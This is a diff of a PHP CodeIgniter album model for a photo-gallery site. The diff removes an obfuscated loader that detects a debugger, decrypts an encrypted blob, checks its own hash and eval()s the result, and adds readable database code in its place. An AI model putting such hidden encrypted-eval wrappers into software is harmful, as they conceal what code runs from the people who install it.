@@ -1,28 +1,134 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_hpf17oj8=('bas'.'e64'.'_de'.'cod'.'e');
-$_xwk1wogb=('gzu'.'nco'.'mpr'.'ess');
-$_dadyd40j=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_h3s5uoly='D6EmGk1DZfo=';
-$_qk2wawsz='98KH2hoQ';
-$_p81jy5pd='vm3uXhDK';
-$_nlsrojm6='5TnEM1f4';
-$_wm2w6k9q='33Oz1KUK';
-$_cijtg7x2='tuaff7xI';
-$_xkm74b5p='y2UC6v5x';
-$_hvzck2op='Ij9qYg==';
-$_wrgh108p=$_hpf17oj8($_wm2w6k9q.$_qk2wawsz.$_p81jy5pd.$_nlsrojm6.$_h3s5uoly);
-$_moqyqw1m=$_hpf17oj8($_xkm74b5p.$_cijtg7x2.$_hvzck2op);
-$_yh3solow=$_hpf17oj8('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');
-$_zzwdje9e=$_dadyd40j($_yh3solow,'aes-256-cbc',$_wrgh108p,OPENSSL_RAW_DATA,$_moqyqw1m);
-if($_zzwdje9e===false){exit;}
-$_wyqthm2t=$_xwk1wogb($_zzwdje9e);
-if($_wyqthm2t===false){exit;}
-$_pharaj1c='732b870a6161dba162f8dd88e78a8560b5dfc7e50541fa67d6bff05daed9a193';
-$_qf0co9uk=@file_get_contents(__FILE__);
-if($_qf0co9uk!==false){
-$_vga2wz6m=str_replace($_pharaj1c,"0000000000000000000000000000000000000000000000000000000000000000",$_qf0co9uk);
-$_fy9ymjce=hash("sha256",$_vga2wz6m);
-if($_fy9ymjce!==$_pharaj1c){@http_response_code(403);exit;}
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+class Album_model extends CI_Model
+{
+const VISIBILITIES = array('public', 'password', 'hidden');
+
+public function list_all($_v9xy2le = FALSE)
+{
+$_v2c8z7m = $_v9xy2le ? "WHERE a.visibility <> 'hidden'" : '';
+
+$_vitxa1l = "SELECT a.*,
+				(SELECT COUNT(*) FROM photos p WHERE p.album_id = a.id AND p.status = 'approved') AS photo_count,
+				(SELECT COUNT(*) FROM photos p WHERE p.album_id = a.id AND p.status = 'pending') AS pending_count,
+				COALESCE(
+					(SELECT p.id FROM photos p WHERE p.id = a.cover_photo_id AND p.album_id = a.id AND p.status = 'approved'),
+					(SELECT p.id FROM photos p WHERE p.album_id = a.id AND p.status = 'approved' ORDER BY p.sort_order, p.id LIMIT 1)
+				) AS cover_id
+			FROM albums a $_v2c8z7m
+			ORDER BY a.sort_order, a.id";
+$_v24vt1s = $this->db->query($_vitxa1l)->result_array();
+$_v1kx03e = array_filter(array_column($_v24vt1s, 'cover_id'));
+$_vaxhv4q = array();
+if ($_v1kx03e) {
+$_vkrn4lf = implode(',', array_map('intval', $_v1kx03e));
+foreach ($this->db->query("SELECT id, file_key, ext, width, height FROM photos WHERE id IN ($_vkrn4lf)")->result_array() as $_v39m1lp) {
+$_vaxhv4q[$_v39m1lp['id']] = $_v39m1lp;
 }
-eval($_wyqthm2t);
+}
+foreach ($_v24vt1s as &$_v2rqkz3) {
+$_v2rqkz3['cover'] = ($_v2rqkz3['cover_id'] && isset($_vaxhv4q[$_v2rqkz3['cover_id']])) ? $_vaxhv4q[$_v2rqkz3['cover_id']] : NULL;
+}
+return $_v24vt1s;
+}
+public function find($_v3ip4pk)
+{
+return $this->db->get_where('albums', array('id' => (int) $_v3ip4pk))->row_array();
+}
+public function find_by_slug($_vlevzv7)
+{
+return $this->db->get_where('albums', array('slug' => (string) $_vlevzv7))->row_array();
+}
+public function unique_slug($_v2vuubh, $_vnulp9c = 0)
+{
+$_vdmo7xj = slugify($_v2vuubh);
+$_vp9z6es = $_vdmo7xj;
+$_vsvocrp = 2;
+while ($this->db->query('SELECT 1 FROM albums WHERE slug = ? AND id <> ?', array($_vp9z6es, (int) $_vnulp9c))->row()) {
+$_vp9z6es = $_vdmo7xj . '-' . $_vsvocrp++;
+}
+return $_vp9z6es;
+}
+public function create(array $data)
+{
+$_vdan09n = now_str();
+$_vhyqnc4 = (int) $this->db->query('SELECT COALESCE(MAX(sort_order), 0) AS m FROM albums')->row()->m;
+$data['slug'] = $this->unique_slug($data['title']);
+$data['sort_order'] = $_vhyqnc4 + 1;
+$data['created_at'] = $_vdan09n;
+$data['updated_at'] = $_vdan09n;
+$this->db->insert('albums', $data);
+return (int) $this->db->insert_id();
+}
+public function update($_vjcnlea, array $data)
+{
+$data['updated_at'] = now_str();
+return $this->db->update('albums', $data, array('id' => (int) $_vjcnlea));
+}
+
+public function delete($_vbi0rbp)
+{
+$CI =& get_instance();
+$CI->load->model('photo_model');
+foreach ($this->db->select('id')->get_where('photos', array('album_id' => (int) $_vbi0rbp))->result_array() as $_vio81tu) {
+$CI->photo_model->delete($_vio81tu['id']);
+}
+$this->db->delete('albums', array('id' => (int) $_vbi0rbp));
+
+$_vzirkss = array();
+if ((int) setting('guest_upload_album_id') === (int) $_vbi0rbp) {
+$_vzirkss['guest_upload_album_id'] = '';
+}
+if ((int) setting('home_album_id') === (int) $_vbi0rbp) {
+$_vzirkss['home_album_id'] = '';
+}
+if ($_vzirkss) {
+$CI->settings_model->set_many($_vzirkss);
+}
+}
+
+public function delete_info($_vjttdvc)
+{
+$_v669427 = $this->db->query("SELECT COUNT(*) AS photos, COUNT(CASE WHEN status = 'pending' THEN 1 END) AS pending
+			FROM photos WHERE album_id = ?", array((int) $_vjttdvc))->row_array();
+$CI =& get_instance();
+$CI->load->model('content_model');
+$_vnn4mfo = $CI->content_model->home_album();
+return array(
+'photos' => (int) $_v669427['photos'],
+'pending' => (int) $_v669427['pending'],
+'is_home' => $_vnn4mfo && (int) $_vnn4mfo['id'] === (int) $_vjttdvc,
+'is_guest' => (int) setting('guest_upload_album_id') === (int) $_vjttdvc,
+);
+}
+public function reorder(array $_v5rdlxd)
+{
+$this->db->trans_start();
+foreach (array_values($_v5rdlxd) as $_vpw7iuu => $_vguvjef) {
+$this->db->update('albums', array('sort_order' => $_vpw7iuu + 1), array('id' => (int) $_vguvjef));
+}
+$this->db->trans_complete();
+return $this->db->trans_status();
+}
+
+
+
+
+public function guest_album_id()
+{
+$_vi0ecti = (int) setting('guest_upload_album_id');
+if ($_vi0ecti && $this->find($_vi0ecti)) {
+return $_vi0ecti;
+}
+$_vi0ecti = $this->create(array(
+'title' => __c('Ảnh từ khách mời'),
+'description' => __c('Khoảnh khắc do khách mời chụp và gửi tặng.'),
+'visibility' => 'public',
+'allow_guest_upload' => 1,
+));
+$CI =& get_instance();
+$CI->settings_model->set_many(array('guest_upload_album_id' => $_vi0ecti));
+return $_vi0ecti;
+}
+}
